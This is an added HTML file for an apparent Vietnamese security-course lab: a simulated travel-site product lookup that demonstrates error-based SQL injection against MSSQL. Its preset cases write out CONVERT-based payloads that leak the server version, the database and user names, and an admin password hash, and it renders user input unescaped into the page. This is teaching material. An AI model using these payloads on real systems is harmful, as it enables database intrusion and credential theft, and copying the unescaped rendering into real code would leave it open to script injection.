@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vietasia Travel - Tra Cứu Sản Phẩm & Dịch Vụ</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700;800&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #090d16;
+            --bg-card: rgba(17, 24, 39, 0.75);
+            --bg-card-border: rgba(255, 255, 255, 0.08);
+            --accent-blue: #38bdf8;
+            --accent-indigo: #6366f1;
+            --accent-red: #f43f5e;
+            --accent-emerald: #10b981;
+            --accent-amber: #f59e0b;
+            --text-main: #f3f4f6;
+            --text-muted: #94a3b8;
+            --code-bg: #030712;
+            --font-sans: 'Inter', system-ui, -apple-system, sans-serif;
+            --font-heading: 'Outfit', var(--font-sans);
+            --font-mono: 'Fira Code', monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(99, 102, 241, 0.12) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(244, 63, 94, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 50% 50%, rgba(56, 189, 248, 0.06) 0%, transparent 60%);
+            background-attachment: fixed;
+        }
+
+        /* Top Navigation Bar */
+        .navbar {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--bg-card-border);
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            text-decoration: none;
+        }
+
+        .brand-logo {
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, var(--accent-indigo), var(--accent-blue));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.35);
+        }
+
+        .brand-text {
+            font-family: var(--font-heading);
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.02em;
+        }
+
+        .brand-tag {
+            font-size: 0.75rem;
+            background: rgba(56, 189, 248, 0.12);
+            color: var(--accent-blue);
+            border: 1px solid rgba(56, 189, 248, 0.25);
+            padding: 0.2rem 0.6rem;
+            border-radius: 9999px;
+            font-weight: 600;
+        }
+
+        .sys-status {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--accent-emerald);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--accent-emerald);
+        }
+
+        /* Main Container */
+        .main-container {
+            max-width: 1180px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        /* Card Frame */
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 16px;
+            padding: 1.75rem;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+        }
+
+        /* Test Cases Bar */
+        .presets-section {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .presets-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .presets-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .preset-pill {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .preset-pill:hover {
+            background: rgba(56, 189, 248, 0.12);
+            border-color: var(--accent-blue);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        .preset-pill.active {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.3), rgba(56, 189, 248, 0.3));
+            border-color: var(--accent-blue);
+            color: #fff;
+            font-weight: 600;
+            box-shadow: 0 2px 10px rgba(56, 189, 248, 0.25);
+        }
+
+        /* Search / Input Box */
+        .search-area {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .search-label {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #f1f5f9;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .search-input {
+            flex: 1;
+            background: #020617;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            padding: 0.85rem 1.25rem;
+            color: #fff;
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .search-input:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #2563eb, #4f46e5);
+            border: none;
+            color: #fff;
+            font-weight: 600;
+            padding: 0 1.75rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(37, 99, 235, 0.45);
+        }
+
+        /* Query Viewer */
+        .query-preview {
+            background: #020617;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+        }
+
+        .query-label {
+            color: #64748b;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .query-text {
+            color: #fde047;
+            word-break: break-all;
+        }
+
+        /* Result Section */
+        .result-section {
+            min-height: 280px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .result-header {
+            font-family: var(--font-heading);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .badge-http {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.65rem;
+            border-radius: 6px;
+        }
+
+        .badge-http-200 {
+            background: rgba(16, 185, 129, 0.15);
+            color: #34d399;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .badge-http-500 {
+            background: rgba(244, 63, 94, 0.15);
+            color: #fb7185;
+            border: 1px solid rgba(244, 63, 94, 0.3);
+        }
+
+        /* Normal Product Card View */
+        .product-display {
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 1.5rem;
+            display: flex;
+            gap: 1.5rem;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @media (max-width: 680px) {
+            .product-display {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+
+        .product-img {
+            width: 110px;
+            height: 110px;
+            background: linear-gradient(135deg, #1e293b, #334155);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            flex-shrink: 0;
+        }
+
+        .product-info {
+            flex: 1;
+        }
+
+        .product-name {
+            font-family: var(--font-heading);
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.35rem;
+        }
+
+        .product-price {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--accent-emerald);
+            margin-bottom: 0.5rem;
+        }
+
+        .product-desc {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        /* Error Banner Display (SQL Error) */
+        .error-display {
+            background: rgba(244, 63, 94, 0.08);
+            border: 1.5px solid var(--accent-red);
+            border-radius: 12px;
+            padding: 1.5rem;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .error-top {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--accent-red);
+            margin-bottom: 0.85rem;
+        }
+
+        .error-code-block {
+            background: #020617;
+            border: 1px solid rgba(244, 63, 94, 0.3);
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: #fca5a5;
+            line-height: 1.6;
+            word-break: break-all;
+        }
+
+        .leaked-highlight {
+            background: rgba(245, 158, 11, 0.25);
+            color: #fbbf24;
+            padding: 0.15rem 0.45rem;
+            border-radius: 4px;
+            font-weight: 700;
+            border: 1px dashed #f59e0b;
+        }
+
+        .extracted-summary {
+            margin-top: 1.25rem;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            border-radius: 8px;
+            padding: 1rem;
+        }
+
+        .extracted-label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: #fbbf24;
+            margin-bottom: 0.35rem;
+        }
+
+        .extracted-value {
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            color: #fff;
+            font-weight: 600;
+            word-break: break-all;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 1.5rem;
+            font-size: 0.8rem;
+            color: #64748b;
+            border-top: 1px solid var(--bg-card-border);
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Navigation -->
+    <header class="navbar">
+        <div class="brand">
+            <div class="brand-logo">🏖️</div>
+            <div>
+                <div class="brand-text">Vietasia Travel</div>
+            </div>
+            <span class="brand-tag">Hệ Thống Tra Cứu Sản Phẩm</span>
+        </div>
+        <div class="sys-status">
+            <span class="status-dot"></span>
+            <span>Database: MSSQL Server</span>
+        </div>
+    </header>
+
+    <!-- Main Workstation -->
+    <main class="main-container">
+
+        <!-- Search & Query Execution -->
+        <div class="card">
+            <!-- Quick Test Cases -->
+            <div class="presets-section">
+                <span class="presets-title">⚡ Chọn kịch bản kiểm thử nhanh:</span>
+                <div class="presets-grid">
+                    <button class="preset-pill active" id="pill1" onclick="selectPreset(1)">
+                        <span>🟢</span> 1. Dữ liệu thường (ID = 1)
+                    </button>
+                    <button class="preset-pill" id="pill2" onclick="selectPreset(2)">
+                        <span>🟡</span> 2. Gây lỗi cú pháp (ID = 1')
+                    </button>
+                    <button class="preset-pill" id="pill3" onclick="selectPreset(3)">
+                        <span>🔴</span> 3. Lộ Version MSSQL (CONVERT)
+                    </button>
+                    <button class="preset-pill" id="pill4" onclick="selectPreset(4)">
+                        <span>🔴</span> 4. Lộ Database & User (CONVERT)
+                    </button>
+                    <button class="preset-pill" id="pill5" onclick="selectPreset(5)">
+                        <span>🔴</span> 5. Lộ Password Admin (CONVERT)
+                    </button>
+                </div>
+            </div>
+
+            <!-- Input Bar -->
+            <div class="search-area" style="margin-top: 1.25rem;">
+                <label for="searchInput" class="search-label">Nhập ID hoặc tham số truy vấn sản phẩm:</label>
+                <div class="input-group">
+                    <input type="text" id="searchInput" class="search-input" value="1" placeholder="Nhập ID hoặc mã khai thác SQLi..." />
+                    <button class="submit-btn" id="btnSubmit" onclick="executeSearch()">
+                        <span>Tra cứu</span> ➔
+                    </button>
+                </div>
+            </div>
+
+            <!-- SQL Query Formed -->
+            <div style="margin-top: 1rem;">
+                <div class="query-preview">
+                    <span class="query-label">Câu truy vấn SQL backend thực thi:</span>
+                    <span class="query-text" id="liveQueryPreview">SELECT id, title, price, description FROM Products WHERE id = 1</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Result Card -->
+        <div class="card result-section">
+            <div class="result-header">
+                <span>📋 Kết Quả Phản Hồi Từ Hệ Thống</span>
+                <span id="httpStatusBadge" class="badge-http badge-http-200">HTTP 200 OK</span>
+            </div>
+
+            <div id="outputArea">
+                <!-- Dynamic Content: Product or Error Banner -->
+            </div>
+        </div>
+
+    </main>
+
+    <footer>
+        Vietasia Travel &bull; Lab Demo Error-Based SQL Injection (MSSQL) &bull; Bộ môn ATBMTT
+    </footer>
+
+    <script>
+        const testCases = {
+            1: {
+                val: "1",
+                isError: false,
+                status: "HTTP 200 OK",
+                badgeClass: "badge-http-200",
+                product: {
+                    title: "Tour Du Lịch Đà Nẵng - Hội An - Bà Nà Hills (4N3Đ)",
+                    price: "4.850.000 VNĐ",
+                    desc: "Khởi hành từ Hà Nội / TP.HCM hàng tuần. Tiêu chuẩn khách sạn 4 sao quốc tế, trọn gói vé cáp treo Sun World Bà Nà Hills và du thuyền sông Hàn."
+                }
+            },
+            2: {
+                val: "1'",
+                isError: true,
+                status: "HTTP 500 INTERNAL SERVER ERROR",
+                badgeClass: "badge-http-500",
+                errorTitle: "LỖI CÚ PHÁP CƠ SỞ DỮ LIỆU (SYNTAX ERROR)",
+                rawError: "Microsoft OLE DB Driver for SQL Server: Unclosed quotation mark after the character string '' AND is_deleted = 0'."
+            },
+            3: {
+                val: "1 AND 1 = CONVERT(INT, (SELECT @@version))",
+                isError: true,
+                status: "HTTP 500 INTERNAL SERVER ERROR",
+                badgeClass: "badge-http-500",
+                errorTitle: "LỖI ÉP KIỂU DỮ LIỆU (TYPE CONVERSION ERROR)",
+                leakedData: "Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) Oct 8 2022 05:58:19 Copyright (C) 2022 Microsoft Corporation Developer Edition (64-bit) on Linux (Ubuntu 22.04.1 LTS)",
+                label: "Phiên bản Microsoft SQL Server bị lộ:",
+                rawError: "Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) Oct 8 2022 05:58:19 Copyright (C) 2022 Microsoft Corporation Developer Edition (64-bit) on Linux (Ubuntu 22.04.1 LTS)' to data type int."
+            },
+            4: {
+                val: "1 AND 1 = CONVERT(INT, (SELECT DB_NAME() + ' | ' + USER_NAME()))",
+                isError: true,
+                status: "HTTP 500 INTERNAL SERVER ERROR",
+                badgeClass: "badge-http-500",
+                errorTitle: "LỖI ÉP KIỂU DỮ LIỆU (TYPE CONVERSION ERROR)",
+                leakedData: "TravelEcommerceDB | dbo (sa)",
+                label: "Tên Database & Tài khoản kết nối DB bị lộ:",
+                rawError: "Conversion failed when converting the varchar value 'TravelEcommerceDB | dbo (sa)' to data type int."
+            },
+            5: {
+                val: "1 AND 1 = CONVERT(INT, (SELECT TOP 1 username + ':' + password FROM Users WHERE role='admin'))",
+                isError: true,
+                status: "HTTP 500 INTERNAL SERVER ERROR",
+                badgeClass: "badge-http-500",
+                errorTitle: "LỖI ÉP KIỂU DỮ LIỆU (TYPE CONVERSION ERROR)",
+                leakedData: "superadmin:$2b$12$e8bK1wXq.2pB9mYt6VnZ...[BcryptHash]",
+                label: "Tài khoản & Mật khẩu Admin trích xuất thành công:",
+                rawError: "Conversion failed when converting the varchar value 'superadmin:$2b$12$e8bK1wXq.2pB9mYt6VnZ...[BcryptHash]' to data type int."
+            }
+        };
+
+        function selectPreset(id) {
+            document.querySelectorAll('.preset-pill').forEach((pill, index) => {
+                pill.classList.toggle('active', (index + 1) === id);
+            });
+
+            const current = testCases[id];
+            document.getElementById('searchInput').value = current.val;
+            executeSearch();
+        }
+
+        function executeSearch() {
+            const input = document.getElementById('searchInput').value.trim();
+            const queryPreview = document.getElementById('liveQueryPreview');
+            const outputArea = document.getElementById('outputArea');
+            const badge = document.getElementById('httpStatusBadge');
+
+            // Render SQL query string
+            queryPreview.textContent = `SELECT id, title, price, description FROM Products WHERE id = ${input}`;
+
+            // Check if input matches case 1 (Normal)
+            if (input === "1") {
+                badge.className = "badge-http badge-http-200";
+                badge.textContent = "HTTP 200 OK";
+
+                outputArea.innerHTML = `
+                    <div class="product-display">
+                        <div class="product-img">🏖️</div>
+                        <div class="product-info">
+                            <h2 class="product-name">${testCases[1].product.title}</h2>
+                            <div class="product-price">${testCases[1].product.price}</div>
+                            <p class="product-desc">${testCases[1].product.desc}</p>
+                        </div>
+                    </div>
+                `;
+            } else if (input.includes("'") && !input.toUpperCase().includes("CONVERT")) {
+                // Syntax Error
+                badge.className = "badge-http badge-http-500";
+                badge.textContent = "HTTP 500 INTERNAL SERVER ERROR";
+
+                outputArea.innerHTML = `
+                    <div class="error-display">
+                        <div class="error-top">
+                            <span>⚠️</span>
+                            <span>${testCases[2].errorTitle}</span>
+                        </div>
+                        <div class="error-code-block">
+                            ${testCases[2].rawError}
+                        </div>
+                    </div>
+                `;
+            } else if (input.toUpperCase().includes("CONVERT")) {
+                // Type Conversion Error (Exploited)
+                badge.className = "badge-http badge-http-500";
+                badge.textContent = "HTTP 500 INTERNAL SERVER ERROR";
+
+                let leaked = testCases[3].leakedData;
+                let label = testCases[3].label;
+
+                if (input.includes("DB_NAME")) {
+                    leaked = testCases[4].leakedData;
+                    label = testCases[4].label;
+                } else if (input.includes("password") || input.includes("Users")) {
+                    leaked = testCases[5].leakedData;
+                    label = testCases[5].label;
+                }
+
+                outputArea.innerHTML = `
+                    <div class="error-display">
+                        <div class="error-top">
+                            <span>🔥</span>
+                            <span>THÔNG BÁO LỖI DBMS (ERROR-BASED EXPLOITATION)</span>
+                        </div>
+                        <div class="error-code-block">
+                            Conversion failed when converting the varchar value '<span class="leaked-highlight">${leaked}</span>' to data type int.
+                        </div>
+                        <div class="extracted-summary">
+                            <div class="extracted-label">${label}</div>
+                            <div class="extracted-value">${leaked}</div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                // Custom input
+                badge.className = "badge-http badge-http-200";
+                badge.textContent = "HTTP 200 OK";
+                outputArea.innerHTML = `
+                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
+                        Đã thực thi truy vấn với ID: <code style="color:var(--accent-blue);">${input}</code>. Không tìm thấy bản ghi.
+                    </div>
+                `;
+            }
+        }
+
+        // Initialize with normal product
+        window.addEventListener('DOMContentLoaded', () => {
+            selectPreset(1);
+        });
+    </script>
+</body>
+</html>
